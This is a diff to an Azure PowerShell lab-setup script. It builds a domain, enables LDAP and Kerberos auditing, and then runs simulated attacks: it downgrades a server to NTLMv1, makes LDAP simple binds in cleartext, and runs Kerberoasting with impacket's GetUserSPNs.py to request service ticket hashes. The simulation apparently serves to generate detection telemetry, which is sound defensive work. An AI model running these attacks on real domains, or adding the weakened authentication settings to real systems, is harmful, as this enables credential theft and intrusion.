@@ -1,6 +1,8 @@
 param (
     [string]$adminAccount,
-    [string]$adminPassword
+    [string]$adminPassword,
+    [string]$LDAPUserAccount1,
+    [string]$LDAPUserAccount2
 )
 
 Import-Module Az.Compute
@@ -294,7 +296,7 @@ foreach ($vmName in $vmNames) {
 New-AzDataCollectionRule -Name $linuxDcrName -ResourceGroupName $resourceGroupName -JsonString $linuxJsonContent
 
 # Add DCR association to VMs
-$linuxVmName = "linuxVM"
+$web01Name = "web01"
 
 
 # Retrieve the ImmutableId for the DCR
@@ -307,32 +309,32 @@ $linuxDataCollectionRuleId = $linuxDcr.Id
 
 
 # Add DCR association to VMs
-$linuxVm = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $linuxVmName
-if (!$linuxVm) {
-    Write-Output "VM '$linuxVmName' not found in Resource Group '$resourceGroupNameOps'." 
+$web01 = Get-AzVM -ResourceGroupName $resourceGroupNameOps -Name $web01Name
+if (!$web01) {
+    Write-Output "VM '$web01Name' not found in Resource Group '$resourceGroupNameOps'." 
 }
 
 # Build the association
-$targetLinuxResourceId = $linuxVm.Id
-$LinuxassociationName = "linuxVM-DCR-Association"
+$targetLinuxResourceId = $web01.Id
+$LinuxassociationName = "web01-DCR-Association"
 # Create DCR association
 New-AzDataCollectionRuleAssociation -TargetResourceId $targetLinuxResourceId `
     -DataCollectionRuleId $linuxDataCollectionRuleId `
     -AssociationName $LinuxassociationName
 
-    Write-Output "DCR Association '$LinuxassociationName' created for VM '$linuxVmName' using Id." 
+    Write-Output "DCR Association '$LinuxassociationName' created for VM '$web01Name' using Id." 
 
 
 # Deploy Azure Monitor Agent to the Linux VM
 $extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
-    -VMName $linuxVmName `
+    -VMName $web01Name `
     -Name "AzureMonitorLinuxAgent" `
     -Publisher "Microsoft.Azure.Monitor" `
     -ExtensionType "AzureMonitorLinuxAgent" `
     -TypeHandlerVersion "1.0" `
     -Location $location
 
-Write-Output "Azure Monitor Agent deployed for VM '$linuxVmName'." 
+Write-Output "Azure Monitor Agent deployed for VM '$web01Name'." 
 
 
 
@@ -440,7 +442,6 @@ param (
 # Import the Active Directory module
 Import-Module ActiveDirectory
 
-New-Item -Path "C:\Temp" -ItemType Directory | out-null
 
 # Define global variables
 `$OUs = @(
@@ -491,10 +492,11 @@ foreach (`$ou in `$OUs) {
     if (-not `$existingOU) {
         # Construct the New-ADOrganizationalUnit path dynamically
         `$ouPath = if (`$parentOU -ne "") { "`$parentOU,`$domainDN" } else { `$domainDN }
-        New-ADOrganizationalUnit -Name `$currentOU -Path `$ouPath |  Out-File c:\temp\log.txt -Append
+        New-ADOrganizationalUnit -Name `$currentOU -Path `$ouPath 
         Write-Host "OU `$ou created"
     }
 }
+
 
 
 # Create service accounts with SPNs in ServiceAccounts OU
@@ -524,7 +526,7 @@ foreach (`$user in `$UserAccounts) {
 }
 
 # Create specific accounts in Admins OU
-New-ADUser -Name `$CandiceKevin.Name -SamAccountName `$CandiceKevin.SamAccountName -UserPrincipalName "`$(`$CandiceKevin.SamAccountName)@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Title `$CandiceKevin.Title -Path "OU=Users,OU=Corp,`$domainDN" | Out-File "c:\temp\log.txt" -Append
+New-ADUser -Name `$CandiceKevin.Name -SamAccountName `$CandiceKevin.SamAccountName -UserPrincipalName "`$(`$CandiceKevin.SamAccountName)@`$domainDNS" -AccountPassword (ConvertTo-SecureString "`$pwd" -AsPlainText -Force) -Enabled `$true -Title `$CandiceKevin.Title -Path "OU=Users,OU=Corp,`$domainDN"
 Write-Output "User `$(`$CandiceKevin.Name) created in Admins OU"
 Add-ADGroupMember -Identity 'HR' -Members `$CandiceKevin.SamAccountName 
 Write-Output "User `$(`$CandiceKevin.Name) added to group HR"
@@ -550,7 +552,10 @@ Write-Output "Active Directory environment setup with OU structure completed suc
 
 
 # Run object creation script on the DC VM
-Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $ADOnjectsCreationScript -Parameter @{"pwd" = $adminPassword}
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $ADOnjectsCreationScript -Parameter @{"pwd" = $adminPassword}
+
+# View the full output of provisioning
+$output.Value | ForEach-Object { $_.Message }
 
 
 #Add DCRs to DC
@@ -594,4 +599,177 @@ $extension = Set-AzVMExtension -ResourceGroupName $resourceGroupNameOps `
         -TypeHandlerVersion "1.0" `
         -Location $location
 
-Write-Output "Azure Monitor Agent deployed for VM '$vmName'." 
+Write-Output "Azure Monitor Agent deployed for VM '$DCvmName'." 
+
+$EnableAuditScriptString = @"
+Write-Output "Enabling LDAP Diagnostics Settings..."
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics" -Name "16 LDAP Interface Events" -Value 2 -Type DWord
+
+Write-Output "LDAP Diagnostics successfully configured."
+
+# Configure Advanced Audit Policies for specific subcategories
+# auditpol /get /category:*
+
+Write-Output "Setting Advanced Audit Policies..."
+
+# Logon/Logoff
+& auditpol.exe /set /subcategory:"Logon" /success:enable /failure:enable
+& auditpol.exe /set /subcategory:"Logoff" /success:disable
+& auditpol.exe /set /subcategory:"Special Logon" /success:enable /failure:enable
+
+# Account Logon
+& auditpol.exe /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
+& auditpol.exe /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+& auditpol.exe /set /subcategory:"Credential Validation" /success:enable
+
+# Account Management
+& auditpol.exe /set /subcategory:"Computer Account Management" /success:enable
+& auditpol.exe /set /subcategory:"Security Group Management" /success:enable
+& auditpol.exe /set /subcategory:"User Account Management" /success:enable
+
+# DS Access
+& auditpol.exe /set /subcategory:"Directory Service Access" /success:enable /failure:enable
+
+Write-Output "Advanced Audit Policies successfully configured."
+
+
+# Define the folder path and share name
+`$FolderPath = "C:\HealthReports"
+`$ShareName = "HealthReports"
+`$Description = "Shared folder for health reports"
+
+# Create the folder if it doesn't exist
+if (-Not (Test-Path `$FolderPath)) {
+    New-Item -ItemType Directory -Path `$FolderPath
+    Write-Output "Folder '`$FolderPath' created."
+} else {
+    Write-Output "Folder '`$FolderPath' already exists."
+}
+
+# Set NTFS permissions: Add "Everyone" with read access
+`$Acl = Get-Acl `$FolderPath
+`$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")
+`$Acl.SetAccessRule(`$AccessRule)
+Set-Acl -Path `$FolderPath -AclObject `$Acl
+Write-Output "NTFS permissions for 'Everyone' set to 'Read'."
+
+# Create the network share
+`$ShareParams = @{
+    Name        = `$ShareName
+    Path        = `$FolderPath
+    Description = `$Description
+}
+New-SmbShare @ShareParams -FullAccess "Administrator" -ReadAccess "Everyone"
+Write-Output "Share '`$ShareName' created and shared with 'Everyone' for read access."
+
+"@
+# Enable LDAP Audit on DC VM
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $DCvmName -CommandId "RunPowerShellScript" -ScriptString $EnableAuditScriptString 
+
+# View the full output
+$output.Value | ForEach-Object { $_.Message }
+
+
+
+#Downgrade to NTLM and access DC file share under an account with NTLM
+$mservscript = @"
+`$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
+`$regValue = "LmCompatibilityLevel"
+
+# Set the desired level
+Set-ItemProperty -Path `$regPath -Name `$regValue -Value 1
+Write-Output "LAN Manager Authentication Level downgraded to NTLMv1 successfully."
+
+`$FileSharePath = "\\10.0.0.4\HealthReports"
+`$securePassword = ConvertTo-SecureString "$adminPassword" -AsPlainText -Force
+`$Credential = New-Object System.Management.Automation.PSCredential ("odomain\da-batch", `$securePassword)
+
+# Directly access the file share with the specified credentials
+`$session = New-PSDrive -Name TempShare -PSProvider FileSystem -Root `$FileSharePath -Credential `$Credential
+try {
+    Get-ChildItem -Path "TempShare:\"
+} finally {
+    Remove-PSDrive -Name TempShare
+}
+
+#Start-Process powershell.exe -Credential `$Credential -ArgumentList "-Command Get-ChildItem -Path `$FileSharePath; Start-Sleep -Seconds 1;Exit"
+Write-Output "Accessed a folder under da-batch account, with downgraded NTLM."
+"@
+# Enable LDAP Audit on DC VM
+$output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "mserv" -CommandId "RunPowerShellScript" -ScriptString $mservscript 
+
+# View the full output
+$output.Value | ForEach-Object { $_.Message }
+
+# LDAP Simple Bind and Kerberosting attack sim
+# Python script to execute on the Linux VM 
+$PythonScript = @"
+from ldap3 import Server, Connection, ALL, SIMPLE
+
+def connect_to_ad(server_address, user, password):
+    server = Server(server_address, get_info=ALL)
+    try:
+        conn = Connection(
+            server,
+            user=user,
+            password=password,
+            authentication=SIMPLE,
+            auto_bind=True
+        )
+        if conn.bind():
+            print(f\"Successfully connected as {user}\")
+        else:
+            print(f\"Failed to bind: {conn.result}\")
+    except Exception as e:
+        print(f\"An error occurred: {e}\")
+    finally:
+        if conn:
+            conn.unbind()
+
+AD_SERVER = 'ldap://10.0.0.4'
+AD_USER1 = 'ODOMAIN\\\\$LDAPUserAccount1'
+AD_USER2 = 'ODOMAIN\\\\$LDAPUserAccount2'
+AD_PASSWORD = '$adminPassword'
+
+connect_to_ad(AD_SERVER, AD_USER1, AD_PASSWORD)
+connect_to_ad(AD_SERVER, AD_USER2, AD_PASSWORD)
+"@
+
+#Write-Output $PythonScript
+
+# Bash command to create and run the Python script
+$Command = @"
+#!/bin/bash
+export DEBIAN_FRONTEND=noninteractive
+sudo apt-get update -y
+sudo apt-get install -y python3-pip python3-venv
+python3 -m pip install --user pipx
+python3 -m pipx ensurepath
+export PATH="`$PATH`:`$HOME/.local/bin"
+python3 -m pipx install impacket
+pip3 install ldap3
+echo "$PythonScript" > /tmp/temp_script.py
+python3 /tmp/temp_script.py
+sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
+unset DEBIAN_FRONTEND 
+"@
+
+
+Connect-AzAccount -Identity
+# Execute the command on the Linux VM
+Write-Output "Executing script on the Linux VM..."
+try {
+    $result = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName `
+                                    -VMName $web01Name `
+                                    -CommandId "RunShellScript" `
+                                    -ScriptString $Command
+
+    if ($result) {
+        Write-Output "Command executed successfully. Output:"
+        $result.Value[0].Message | Write-Output
+    } else {
+        Write-Output "Command execution failed or returned no output."
+    }
+} catch {
+    Write-Error "Failed to execute command: $_"
+}
